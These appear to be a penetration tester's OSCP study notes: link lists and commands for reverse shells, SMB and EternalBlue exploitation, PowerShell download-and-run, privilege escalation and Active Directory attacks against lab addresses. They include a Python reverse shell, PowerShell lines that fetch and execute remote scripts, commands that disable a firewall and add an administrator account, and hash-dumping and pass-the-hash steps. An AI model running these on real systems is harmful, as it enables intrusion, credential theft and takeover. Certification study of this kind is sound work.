# OSCP-NOTES
## Reverse Shell
> - https://medium.com/@nmappn/exploiting-smb-samba-without-metasploit-series-1-b34291bbfd63
> - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
> - https://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/
> - https://sushant747.gitbooks.io/total-oscp-guide/content/reverse-shell.html
> - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
> - https://blog.adithyanak.com/oscp-preparation-guide/windows-reverse-shells
> - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.171",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

### DNS Zone transfer
> - nslookup 
> - >server ip
>  -> ip 
>  after that -> host -l domain-name ip-address


### Shellshock
> - nmap -p80 -sV --script http-shellshock --script-args "uri=/cgi-bin/user.sh" 10.10.10.56

### Gobuster 
> - gobuster dir -u http://10.10.10.56/cgi-bin -x sh,pl -w /usr/share/wordlists/dirb/common.txt
> - gobuster dir -u http://10.10.10.56:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s "200,204,301,302,307,401,403" -x "txt,html,php,asp,aspx,jsp"

## Samba 
### Exploit samba without metasploit
> - https://medium.com/@nmappn/exploiting-smb-samba-without-metasploit-series-1-b34291bbfd63
> - https://redteamzone.com/EternalRed/
> - https://www.hackingtutorials.org/scanning-tutorials/scanning-for-smb-vulnerabilities-using-nmap/
> - https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
### Fix samba version
> - https://unix.stackexchange.com/questions/450986/linux-to-windows-can-list-smb-shares-but-cannot-connect 

## SQL Injection
### Mysql :
> - http://lastc0de.blogspot.com/2013/07/tutorial-sql-injection-manual.html
> - https://exploit.linuxsec.org/tutorial-sql-injection-manual/
### Oracle 
> - http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
### MSSQL
> - https://www.exploit-db.com/docs/english/44348-error-based-sql-injection-in-order-by-clause-(mssql).pdf
> - https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
> - https://bhanusnotes.blogspot.com/2019/09/sql-injection-cheat-sheet.html
## MSFVENOM cheat Sheet
> - https://book.hacktricks.xyz/shells/shells/msfvenom 
> - https://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/
> - https://sushant747.gitbooks.io/total-oscp-guide/content/reverse-shell.html

## File transfer cheat sheet
> - https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/
> - https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
> - https://techmonger.github.io/3/linux-windows-ftp/
> - sudo impacket-smbserver -smb2support test . -> attacker machine
> - copy \\192.168.119.161\test\winPEASx86.exe winPEASx86.exe -> vitim machine 

## Powershell 
### Check powershell running on system 64 or 32 
> - [Environment]::Is64BitProcess 
### Command powershell to get reverse shell 
> - powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.119.153/Invoke-PowerShellTcp.ps1')"
> - C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://192.168.119.180/Invoke-MS16032.ps1')” -bypass executionpolicy
### POWERSHELL TO RUNNING MIMIKATZ
> - https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/
> - https://theitbros.com/managing-windows-defender-using-powershell/  

### Powershell to PE
> - Install sherlock ps1 github And run -> powershell "IEX(New-Object Net.WebClient).downloadString('http://192.168.119.180/Sherlock.ps1'); Find-AllVulns”


## Windows PE
### juice potato
> - Check juice potato work or not with command "Whoami /priv". If SeImpersonatePrivilege is enabled yes . you can exploit that.
> - powershell "IEX(New-Object Net.WebClient).downloadFile('http://192.168.119.161:8000/JuicyPotato.exe','C:\test\JuicyPotato.exe')" -bypass executionpolicy
> - Create this script to show clsid :
> - ![image](https://user-images.githubusercontent.com/26652599/139693143-5dd4ae2c-c5b3-4bc7-80df-c84236e5b88a.png)

> $ New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
> $ $CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object
> $ {$_.appid -ne $null}
> $foreach($a in $CLSID)
> $ {
> $    Write-Host $a.CLSID
> $ }
> - or follow it https://medium.com/@kunalpatel920/cyberseclabs-weak-walkthrough-d66d2e47cd82 , https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html

### Windows XP SP0/SP1 Privilege Escalation to System
> - https://sohvaxus.github.io/content/winxp-sp1-privesc.html
> - check permission of all services 'accesschk.exe /accepteula -uwcqv "Authenticated Users" *'
> - Then check service running on higher privilege or not with command : Sc qc <service_name> 
> - https://payatu.com/blog/suraj/Windows-Privilege-Escalation-Guide
> - https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html

## Linux PE
> - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
> - https://gtfobins.github.io/#+sudo%20
> - https://atom.hackstreetboys.ph/linux-privilege-escalation-cron-jobs/
> - https://tryhackme.com/room/linuxprivesc
### LIST KERNEL EXPLOTATION 
> - https://github.com/anoaghost/Localroot_Compile/blob/master/README.md
### DOCKER PRIVILLAGE ESCALATION 
> - https://www.hackingarticles.in/docker-privilege-escalation/
> - ![image](https://user-images.githubusercontent.com/26652599/139695751-27ed4014-908e-4807-a3a4-9406a75981ef.png)
### UPGRADING SHELL
> - https://refabr1k.gitbook.io/oscp/privesc-linux/upgrading-shells


## EternalBlue
> - If smb has AV (anti virus or firewall active disable AV with this code : service_exec(conn, r'cmd /c netsh firewall set opmode disable') 
> - And if rdp active add user and add user to group administrator using this command :service_exec(conn, r'cmd /c net user bill pass /add')
service_exec(conn, r'cmd /c net localgroup administrators bill /add')

> - https://redteamzone.com/EternalBlue/ 
> - https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
> - https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/
> - https://root4loot.com/post/eternalblue_manual_exploit/
> - https://www.cybersecpadawan.com/2020/05/tryhackme-blue-eternalblue-exploitation.html

## BOF 
> - https://www.noobsec.net/bof/
> - https://ricobandy.github.io/vulnhub/Brainpan-Vulnhub/
> - https://offs3cg33k.medium.com/brainpan-vulnhub-walkthrough-143f1b3786c5
> - https://tcm-sec.com/buffer-overflows-made-easy/

## MULTIPLE WAY TO EXPLOIT TOMCAT MANAGER
> - https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/


## active Directory
> - git clone https://github.com/Sq00ky/attacktive-directory-tools.git
> https://medium.com/@daniela.mh20/attacktive-directory-thm-walkthrough-9a7f0c7cc925 
> #executable kerbrute
 
$ chmod u=rwx kerbrute 
$ chmod +x kerbrute #useful command
 
$ ./kerbrute -h  #can see the usage for kerbrute

$ ./kerbrute userenum --dc 10.10.71.93 -d spookysec.local userlist.txt -t 100

$ GetNPUsers.py -no-pass -dc-ip 10.10.71.93 spookysec.local/svc-admin

$ hashcat -m 18200 -a 0 hash.txt passwordlist.txt --force

we can again at the smb
$ smbclient -L 10.10.116.78 -U ‘svc-admin’

$ secretsdump.py -h
$ impacket-secretsdump -just-dc <backup:backup2517860@10.10.63.2>Useful links

$ evil-winrm -i 10.10.63.2 -u Administrator -H e4876a80a723612986d7609aa5ebc12b 







